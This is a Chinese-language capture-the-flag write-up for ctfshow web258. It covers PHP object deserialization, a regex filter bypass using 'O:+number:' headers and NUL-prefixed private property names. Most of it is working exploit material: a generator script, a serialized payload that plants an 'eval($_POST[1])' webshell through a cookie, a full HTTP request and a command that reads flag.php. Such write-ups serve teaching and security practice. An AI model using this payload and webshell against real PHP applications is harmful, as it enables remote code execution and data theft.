## 一句话概括

web258 = **web257 的利用链 + 07 篇的 `O:+数字` 正则绕过**。防线只是「拦 `O:数字:` 这种串」，于是把对象头的 `O:11:` 写成 `O:+11:`（内层 `O:8:` 同理）就能骗过过滤；同时把 `backDoor::$code` 填成 **`eval($_POST[1]);`**，用一次反序列化换来一个「随后的 POST 都归我」的**持久化后门**。

## 本题情景与解题手法

> 原笔记 `web258.md` 保留了**类定义 + 一段生成脚本 + 一个「为什么这个不对啊」的失败 payload**。本文按笔记整理，并解释了那个 payload 为什么不行。

### 题目形态（按笔记保留的类定义）

```php
<?php
class ctfShowUser {
    private $username = 'xxxxxx';
    private $password = 'xxxxxx';
    private $isVip    = true;
    private $class;                                 // ★ private
    public function __construct() {
        $this->class = new backDoor();
    }
}

class backDoor {
    private $code = "system('ls -la');";            // ★ private，出口
}
?>
```

和 11 篇（web257）是**同一套类**，区别在防御：本题对提交的序列化串做了**正则过滤**（拦 `O:数字:`），所以要绕。

### 第一步：认清两道坎

| 坎 | 内容 | 应对 |
|---|---|---|
| 正则过滤 | 拦 `/[oc]:\d+:/i` 这类固定特征串 | 数字前加 `+`：`O:11:` → `O:+11:`（见 07 篇） |
| 属性前缀 | `$class` / `$code` 都是 **`private`** | 属性名必须写成 `\0类名\0属性名`，长度按带 `\0` 算 |

### 第二步：为什么笔记里那个 payload「不对」

原笔记手写了一个 payload，末尾自发问了句「为什么这个不对啊」：

```text
O:+11:"ctfShowUser":1:{s:5:"class";O:+8:"backDoor":1:{s:4:"code";s:16:"eval($_POST[1]);";}}
```

它**至少有两处问题**：

| 问题 | 说明 |
|---|---|
| ① 属性名没带 `\0` 前缀 | `$class` / `$code` 是 **`private`**，应由 `s:18:"\0ctfShowUser\0class"` / `s:14:"\0backDoor\0code"` 表示；写成 `s:5:"class"` / `s:4:"code"` 会变成**动态属性**，赋值赋不到类里那个 `private` 属性上，`code` 自然也就进不了 `eval` |
| ② 内层 `O:8:` 是否也要 `+` | 若题目的正则是 `/[oc]:\d+:/i`（**不锚定**），那么内层的 `O:8:"backDoor"` 同样会被拦 —— 外层加了 `+` 也白搭。笔记的生成脚本只 `str_replace('O:11:',...)`，漏了内层，属于同类问题 |

判定谁是主因要看题目的正则写法：锚定 `^O:\d+:` 只需管外层；不锚定则**每一处 `O:` 都要加 `+`**。稳妥做法是**一步到位写对属性和 `+`**。

### 第三步：构造「对」的 payload

```php
<?php
class ctfShowUser {
    private $username = 'xxxxxx';
    private $password = 'xxxxxx';
    private $isVip    = true;
    private $class;
    public function __construct() { $this->class = new backDoor(); }
}
class backDoor {
    private $code = "eval(\$_POST[1]);";        // ★ 改成一句话后门
}

$payload    = new ctfShowUser();
$serialized = serialize($payload);              // 自动带上 \0 前缀
// ★ 每一处 O: 都加 +，而不是只替 O:11:
$bypassed   = preg_replace('/O:(\d+):/', 'O:+$1:', $serialized);
echo "Cookie: user=" . urlencode($bypassed);
?>
```

> 笔记里只写了 `str_replace('O:11:', 'O:+11:', ...)` —— 若正则不锚定，请用上面的 `preg_replace` **把所有 `O:数字:` 一次性替换**，否则内层仍会被拦。

手工写出来的目标结构（`\0` 在 URL 里写 `%00`）：

```text
O:+11:"ctfShowUser":1:{s:18:"%00ctfShowUser%00class";O:+8:"backDoor":1:{s:14:"%00backDoor%00code";s:16:"eval($_POST[1]);";}}
```

长度核对：

| 字段 | 值 | 字节数 |
|---|---|---|
| 类名 | `ctfShowUser` | 11 |
| `private` 名 | `\0ctfShowUser\0class` | 1+11+1+5 = **18** |
| 类名 | `backDoor` | 8 |
| `private` 名 | `\0backDoor\0code` | 1+8+1+4 = **14** |
| 代码串 | `eval($_POST[1]);` | **16** |

### 第四步：提交 —— cookie 带对象、body 带命令

因为 `$code` 是 **`eval($_POST[1])`**，触发反序列化只是「装上了一句话」，**真正执行命令的是同一个请求（或后续请求）的 POST body**：

```http
POST /?username=1&password=2 HTTP/1.1
Host: 靶机地址
Cookie: user=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

1=system('tac flag.php');
```

要点：`Cookie: user=` 是**对象**（装后门），body 里 `1=...` 是**命令**（用后门）。两件事在同一个请求里完成。

### 注入手法一句话总结

> **`O:11:` 写 `O:+11:`（内层 `O:8:` 同理）绕正则** + **`private` 属性名写成 `\0类名\0属性名`** → `backDoor::$code = eval($_POST[1]);` → cookie 里塞嵌套对象、body 里塞命令 → 反序列化恢复出对象图、`eval` 执行 `$_POST[1]` → 拿到命令执行。

## 利用条件

1. **有可控 `unserialize()`**（本题经 cookie `user`）；
2. **过滤发生在 `unserialize()` 之前**，且拦的是 `O:数字:` 这种固定串（`+` 号才能骗过去，见 07 篇）；
3. **目标 PHP 版本对 `O:+数字` 宽容**（PHP 7.x 有效；PHP 8.3 实测已拒绝，见 07 篇）；
4. **属性前缀写对**：`private` / `protected` 必须带 `\0` 前缀且长度算满（见 01 篇）。

## Payload 速查

| 目的 | 写法 |
|---|---|
| 绕 `[oc]:\d+:` 正则 | 每一处 `O:数字:` → `O:+数字:` |
| 一次替换所有对象头 | `preg_replace('/O:(\d+):/', 'O:+$1:', $serialized)` |
| `private` 属性名 | `%00ctfShowUser%00class`（长度 18）、`%00backDoor%00code`（长度 14） |
| 一句话后门 | `s:16:"eval($_POST[1]);";` |
| 执行命令 | body：`1=system('tac flag.php');` |
| cookie 提交 | `Cookie: user=<urlencode(payload)>` |

## 踩坑与备注

- **本题最常见的两个坑**（也是笔记「为什么这个不对啊」的答案）：① 忘了 `private` 的 `\0` 前缀，属性赋了个寂寞；② 只给外层 `O:` 加了 `+`，内层 `O:8:` 被同一个正则拦下。
- **`+` 必须紧贴数字、且在数字前**：`O:+11:` ✓；`O+11:`、`O:11+:` 都不对（见 07 篇）。
- **`O:+` 只是 PHP 7.x 的宽容行为**：现代 PHP 8 已拒绝，做题先确认目标版本；不行就换 08 篇里的其它手法（大写 `S`、类名大小写、引用 `R:`）。
- **`eval($_POST[1]);` 里的 `$_POST` 在生成脚本里要写 `\$_POST`**（双引号字符串里 `$` 会被插值），否则生成的 payload 会缺字符。
- **「装后门」和「执行命令」是两件事**：cookie 负责反序列化出一个带 `eval` 的对象，body 的 `1=` 才是命令；只发 cookie 不发 body，只会执行一个空的 `eval`。
- **`tac` 而非 `cat`**，理由见 11 篇；找 flag 路径的通用手法同样交叉参考 **04-文件上传 / 找flag的辅助脚本**。
- **原笔记的靶机地址（含 UUID）已抽象**为 `靶机地址`。
